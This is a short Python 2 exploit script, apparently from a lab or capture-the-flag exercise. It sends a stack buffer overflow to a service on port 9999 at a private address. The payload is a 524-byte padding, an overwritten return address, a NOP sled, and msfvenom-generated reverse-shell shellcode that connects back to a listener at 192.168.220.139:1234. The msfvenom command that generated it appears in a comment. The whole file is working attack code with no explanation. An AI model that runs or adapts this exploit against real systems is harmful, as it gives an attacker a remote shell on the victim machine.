#!/usr/bin/python
#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.220.139 LPORT=1234 EXITFUNC=thread -f python -v shellcode -a x86 -b "\x00"#


import socket

shellcode =  b""
shellcode += b"\xba\x14\x8d\x37\xde\xda\xc9\xd9\x74\x24\xf4"
shellcode += b"\x58\x2b\xc9\xb1\x12\x31\x50\x12\x03\x50\x12"
shellcode += b"\x83\xfc\x71\xd5\x2b\xcd\x52\xed\x37\x7e\x26"
shellcode += b"\x41\xd2\x82\x21\x84\x92\xe4\xfc\xc7\x40\xb1"
shellcode += b"\x4e\xf8\xab\xc1\xe6\x7e\xcd\xa9\x38\x28\xf1"
shellcode += b"\xa2\xd1\x2b\x0a\xb0\xf3\xa5\xeb\x08\x95\xe5"
shellcode += b"\xba\x3b\xe9\x05\xb4\x5a\xc0\x8a\x94\xf4\xb5"
shellcode += b"\xa5\x6b\x6c\x22\x95\xa4\x0e\xdb\x60\x59\x9c"
shellcode += b"\x48\xfa\x7f\x90\x64\x31\xff"

try:
  print "\n[+] Sending evil buffer..."
  offset = "A" * 524
  eip = "\xf3\x12\x17\x31"
  nops = "\x90" * 10

  buffer = offset + eip + nops + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.220.136", 9999))
  s.send(buffer)
  
  s.close()
 
  print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
  print "\n[+] Sending buffer: " + buffer
  print "\n[+] Done!"
  
except:
  print "\n[+] Could not connect!"
